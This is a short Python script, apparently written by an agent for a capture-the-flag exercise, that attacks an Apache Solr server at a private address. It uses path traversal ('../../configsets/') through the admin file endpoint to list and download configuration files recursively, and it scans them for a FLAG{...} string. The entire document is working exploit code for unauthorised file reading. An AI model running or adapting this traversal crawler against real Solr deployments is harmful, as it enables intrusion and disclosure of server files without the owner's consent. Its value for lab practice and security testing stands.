import urllib.request, urllib.parse, urllib.error, json, re
from collections import deque
base = 'http://192.168.5.7:8983/solr/demo/admin/file?file='
visited = set()
queue = deque(['../../configsets/'])
regex = re.compile(r'FLAG\{[^}]+\}')
headers = {'User-Agent':'ctf-agent'}
found = False

def fetch(path):
    url = base + urllib.parse.quote(path, safe='/-._~')
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read()

while queue and not found:
    path = queue.popleft()
    if path in visited:
        continue
    visited.add(path)
    try:
        data = fetch(path)
    except urllib.error.HTTPError:
        continue
    except Exception:
        continue
    try:
        obj = json.loads(data)
    except json.JSONDecodeError:
        continue
    for name, info in obj.get('files', {}).items():
        child = path + name + ('/' if info.get('directory') else '')
        if info.get('directory'):
            queue.append(child)
        else:
            try:
                content = fetch(child)
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue
            text = content.decode('utf-8', errors='ignore')
            match = regex.search(text)
            if match:
                print(path + name, match.group())
                found = True
                break
if not found:
    print('FLAG not found in accessible configsets files')
